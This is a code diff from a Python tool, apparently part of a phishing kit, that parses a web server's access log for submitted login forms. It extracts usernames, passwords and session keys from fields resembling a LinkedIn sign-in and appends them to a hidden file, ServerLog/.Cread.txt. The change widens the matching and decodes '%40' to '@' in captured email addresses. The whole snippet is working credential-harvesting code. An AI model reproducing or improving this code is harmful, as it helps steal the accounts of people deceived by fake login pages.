@@ -26,10 +26,10 @@ class dns_result :
               Log_read = Log_Handel.readlines()
           for line in Log_read:     
               if '%40'in  line  : 
-                if "username" in line :
-                   line = line.split('=')
+                if "username" in line  or "key" in line:
+                   line = line.split('=')                  
                 else:
-                     line       = line.split('&')  
+                     line  = line.split('&')  
                 line_split = str(line[1:3]).split('+&password')
                 line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ')\
                 .replace("+&session_password=1",'').replace("&session_key ",'').replace('session_key=','')\
@@ -43,7 +43,8 @@ class dns_result :
                     .replace('&isJsEnabled','').replace("&session_key=",'').replace('&session_password=1','')\
                     .replace("+&session_password",'').replace("session_password=",'').replace(",",'').strip()  
                     with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
-                        Cread_User.write(line_cread_1+'\n'+line_cread_2+'\n')
+
+                        Cread_User.write(line_cread_1.replace("%40",'@')+'\n'+line_cread_2.replace("%40",'@')+'\n')
                 except IndexError:
                        pass          
                 with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
